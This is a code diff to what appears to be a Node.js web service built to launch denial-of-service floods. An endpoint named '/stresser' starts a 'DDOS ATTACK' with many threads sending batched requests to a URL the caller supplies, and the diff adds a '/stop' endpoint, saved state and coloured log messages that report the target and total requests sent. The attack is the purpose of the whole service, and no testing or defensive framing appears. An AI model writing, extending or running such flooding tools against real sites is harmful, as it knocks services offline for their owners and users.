@@ -133,7 +133,10 @@ const estimateTotalRequests = (durationHours) => {
 };
 
 const performAttack = async (url, agent, threadId) => {
-    if (!continueAttack) return;
+    if (!continueAttack) {
+        console.log(rainbow(`Thread ${threadId}: Stopped.`));
+        return;
+    }
 
     // Check if duration has expired
     if (startTime && duration) {
@@ -294,6 +297,24 @@ app.get("/stresser", (req, res) => {
 
     res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD * 2} requests per batch...` });
     startAttack(url, durationHours);
+});
+
+// Endpoint to stop the attack
+app.get("/stop", (req, res) => {
+    if (!continueAttack) {
+        return res.json({ message: "No active attack to stop." });
+    }
+
+    continueAttack = false;
+    state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+    fs.writeFileSync(stateFilePath, JSON.stringify(state));
+    
+    res.json({ message: `Attack stopped. Target: ${targetUrl}, Total Requests Sent: ${totalRequestsSent.toLocaleString()}` });
+    console.log(rainbow(
+        `🛑 Attack Stopped Manually 🛑\n` +
+        `Target: ${targetUrl}\n` +
+        `Total Requests Sent: ${totalRequestsSent.toLocaleString()}`
+    ));
 });
 
 const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
